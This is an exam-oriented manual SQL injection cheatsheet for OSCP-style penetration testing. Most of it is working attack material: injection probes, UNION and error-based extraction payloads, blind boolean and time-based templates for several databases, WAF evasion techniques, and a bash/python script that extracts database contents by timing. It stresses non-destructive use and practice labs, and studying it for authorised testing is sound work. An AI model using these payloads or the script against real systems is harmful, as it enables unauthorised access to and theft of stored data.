# Manual SQL Injection Cheatsheet — exam-focused (manual first)

Quick goal: provide a concise, reliable manual SQLi reference you can use during OSCP-style exams. This file is intentionally practical: payload templates, DBMS-specific syntax, blind extraction scripts you can adapt, WAF evasion patterns, and runbook-style workflows for evidence capture.

Important exam notes
- Do NOT run sqlmap or similar automated exploitation tools during the exam environment unless the rules explicitly allow them. The exam expects manual exploitation or scripts you write.
- Always keep exact payloads, commands and captured output for your report evidence.
- Prefer non-destructive enumeration. Avoid writes, file system access, or shell uploads unless explicitly allowed.

Contents / quick index
- Detection & fingerprinting
- Enumeration: find columns, UNION and ORDER BY techniques
- Error-based extraction (DBMS-specific examples)
- Boolean blind (binary search) and Time-based extraction (timing)
- POST/JSON/headers and non-standard injection points
- WAF/IPS evasion patterns
- Practical extraction workflow & reporting checklist
- Utility scripts and example templates (bash/python)
- DBMS quick reference (MySQL, Postgres, MSSQL, Oracle)

1) Detection & quick tests
- Basic quick probes (URL-encode when inserting into GET parameter):
  - ' OR '1'='1' --
  - " OR "1"="1" --
  - id=1'  (look for an error, different content, redirect or change in status code)
- Observe these indicators of injection:
  - SQL error messages in response body
  - Differences in page content length
  - Differences in status code (200 vs 500/302)
  - Time differences (for time-based payloads)

2) Fingerprinting DBMS (fast manual methods)
- Error strings: MySQL (You have an error in your SQL syntax), PostgreSQL (syntax error at or near), MSSQL (unclosed quotation mark after the character string), Oracle (ORA-00933)
- Try DBMS-specific functions to probe behavior (non-destructive):
  - MySQL: version() , database() , user()
  - Postgres: version(), current_database()
  - MSSQL: @@version, DB_NAME()
  - Oracle: (select banner from v$version where rownum=1)
- Use a harmless boolean test to fingerprint: e.g. append " AND 1=1" then " AND 1=2" and compare results.

3) Find number of columns and injectable columns
- ORDER BY method to find column count:
  - /page?id=1 ORDER BY 1--
  - increment until you get an error; last successful index = number of columns
- UNION SELECT method to find which columns reflect to page:
  - Start: /page?id=1 UNION ALL SELECT NULL,NULL,NULL--
  - Replace NULLs with distinct markers 'a','b',1,2,to see where output is reflected.
  - If types mismatch produce casted values: e.g. CAST(1 AS CHAR) or use CONCAT/CAST to force string types.
- Tips:
  - When UNION fails because of different types, try to place string functions (version(), user()) into columns known to render in page.
  - If site uses prepared statements and UNION is blocked, fallback to blind extraction.

4) UNION enumeration patterns
- Template: /page?id=1 UNION ALL SELECT NULL,NULL,version(),user() -- -
- If UNION fails:
  - Use ORDER BY to confirm count, then test each column: UNION SELECT 'col1',NULL,NULL-- then 'col2', etc.
  - Use database-specific concatenation to place multiple values in a single column: CONCAT(schema_name,0x3a,table_name)
- When results are truncated in page, try using GROUP_CONCAT or LIMIT to reduce output size and separate entries.

5) Error-based extraction (examples)
- MySQL error-based using extractvalue / updatexml (if available):
  - Get database name: ' AND extractvalue(1,concat(0x7e,(select database()),0x7e))-- -
  - Alternate: ' OR (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,@@version,0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
- Postgres and MSSQL generally less noisy; use boolean/time or information_schema queries.

6) Boolean blind extraction (binary search per char) — recommended for speed
- Strategy: for each character position i, binary-search ASCII range (32..126) by asking whether ASCII > mid.
- Boolean template (MySQL):
  - ' AND (ASCII(SUBSTRING((SELECT database()),%d,1))>%d) -- -
- Use response differences (content, length, or specific strings) to determine true/false.

7) Time-based blind extraction (reliable when boolean clues are not visible)
- MySQL template: ' OR IF(ASCII(SUBSTRING((SELECT %s),%d,1))>%d,SLEEP(%d),0) -- -
- Postgres template: ' OR CASE WHEN (ASCII(SUBSTRING((SELECT %s),%d,1))>%d) THEN pg_sleep(%d) ELSE pg_sleep(0) END -- -
- MSSQL template: ' IF(ASCII(SUBSTRING((SELECT %s),%d,1))>%d) WAITFOR DELAY '00:00:%02d' -- -

8) Practical extraction workflow (concise runbook)
1) Recon / fingerprint DBMS (errors, harmless functions)
2) Identify injectable parameter and context (GET/POST/JSON/header/cookie)
3) Find columns with ORDER BY and test reflective columns with UNION
4) Attempt non-blind extraction (UNION / error-based) for short values: database(), user(), version()
5) If non-blind blocked -> switch to boolean or time-based blind and use binary search per character
6) Extract schema: information_schema.tables -> table names -> column names -> data (chunked)
7) Store every command and full HTTP request/response for reporting
8) Stop when you have required proof; do not escalate to destructive techniques unless allowed

9) WAF / encoding / evasion tricks (pragmatic)
- Basic encodings: URL-encode, double-encode (%2527), hex-encode payloads where DB accepts (0x...) for MySQL
- Inline comments and whitespace variants: / *...* /, /*!50000sleep(5)*/ for MySQL (version specific), %09 or %0a to bypass naive filters
- Case folding: use mixed/upper case keywords (SeLeCt) to bypass naive blocklists
- Char()/CHAR() concatenation: build strings via CHAR(97,98,99) when quotes are filtered
- Break payloads across parameters and reassemble via SQL functions if permitted
- If WAF blocks UNION, try using ORDER BY or error-based methods, or exploit second-order injection points

10) Injection points beyond GET
- POST (form data) – ensure proper Content-Type; include payloads in body parameters.
- JSON APIs – inject inside JSON string values and set header "Content-Type: application/json".
- Cookies, User-Agent, Referer headers – sometimes unfiltered.

11) Chunking & performance tips
- Binary search reduces requests from ~95 per char to ~7 per char.
- Extract shorter values first (db, user, version) to confirm approach before larger dumps.
- Use LIMIT and ORDER BY to enumerate tables in chunks and avoid huge single responses.

12) Evidence & reporting checklist (what to save)
- Full HTTP request and response for each successful extraction proof
- Timestamped notes of commands used and parameterized payloads
- Screenshots of responses (error messages, returned content)
- Local copies of any scripts used to extract data

13) DBMS quick reference (helpful function names and templates)
- MySQL:
  - functions: version(), database(), user(), @@version
  - time-based: IF(condition,SLEEP(n),0)
  - string ops: CONCAT(), SUBSTRING(), CHAR()
- PostgreSQL:
  - functions: version(), current_database(), current_user
  - time-based: CASE WHEN (cond) THEN pg_sleep(n) ELSE pg_sleep(0) END
  - string ops: substring(), concat()
- MSSQL:
  - functions: @@version, SUSER_NAME(), DB_NAME()
  - time-based: WAITFOR DELAY '00:00:NN' combined with CASE
  - string ops: SUBSTRING(), CHAR()
- Oracle:
  - functions: user, SYS_CONTEXT, (select banner from v$version where rownum=1)
  - time-based: dbms_lock.sleep(n) (may require privileges)

14) Utility extraction scripts (templates you can adapt)
- Small, robust bash + python template for time-based blind extraction (MySQL example). Adapt URL, parameter and payload building to the target. Use this as a starting point and tailor delays / detection thresholds.

```bash
#!/usr/bin/env bash
# manual_time_extract.sh
# Usage: ./manual_time_extract.sh "http://TARGET/page?id=" "' OR IF(ASCII(SUBSTRING((SELECT %s),%d,1))>%d,SLEEP(%d),0)-- -'" 3 40

BASEURL="$1"
PAYLOAD_TEMPLATE="$2"  # printf-style: %s -> column/expression, %d -> pos, %d -> mid, %d -> delay
DELAY=${3:-3}
MAX_POS=${4:-40}

result=""
for pos in $(seq 1 $MAX_POS); do
  low=32; high=126
  while [ $low -le $high ]; do
    mid=$(( (low+high)/2 ))
    payload=$(python3 - <<PY
import urllib.parse, sys
tpl = """$PAYLOAD_TEMPLATE"""
raw = tpl % ("database()", $pos, mid, $DELAY)
print(urllib.parse.quote(raw))
PY
)
    t=$(curl -s -o /dev/null -w "%{time_total}" "${BASEURL}${payload}")
    # determine if sleep triggered
    triggered=$(python3 - <<PY
t=float("${t}")
print(1 if t>(${DELAY}-0.7) else 0)
PY
)
    if [ "$triggered" -eq 1 ]; then
      low=$((mid+1))
    else
      high=$((mid-1))
    fi
  done
  if [ "$low" -lt 32 ] || [ "$low" -gt 126 ]; then break; fi
  ch=$(printf "\\x$(printf %x $low)")
  result="${result}${ch}"
  echo "pos $pos -> $ch"
done
echo "result: $result"
```

Notes on script: adjust DELAY and threshold depending on network noise. Run short tests to determine noise baseline.

15) Quick payload cheat sheet
- MySQL boolean:    ' AND (SELECT SUBSTRING((SELECT database()),1,1))='a' -- -
- MySQL time:       ' OR IF(ASCII(SUBSTRING((SELECT database()),1,1))>100,SLEEP(3),0) -- -
- Postgres time:    ' OR CASE WHEN (ASCII(SUBSTRING((SELECT current_database()),1,1))>100) THEN pg_sleep(3) ELSE pg_sleep(0) END -- -
- MSSQL time:       ' IF(ASCII(SUBSTRING((SELECT DB_NAME()),1,1))>100) WAITFOR DELAY '00:00:03' -- -

16) Final tips
- Practice these workflows on deliberately vulnerable VMs (VulnHub, HackTheBox labs). Time-based extraction is slow — always prefer UNION or error-based where possible.
- Keep a personal, minimal set of go-to scripts and a daily checklist for exam day: fingerprint -> triage -> extract -> document.

References / workspace notes
- See local walkthroughs in this repo (e.g. `Linux/Help/notes.txt`, `Linux/Pilgrimage/oscp_pilgrimage_notes.txt`) for contextual payloads and examples.

----
End of cheatsheet.
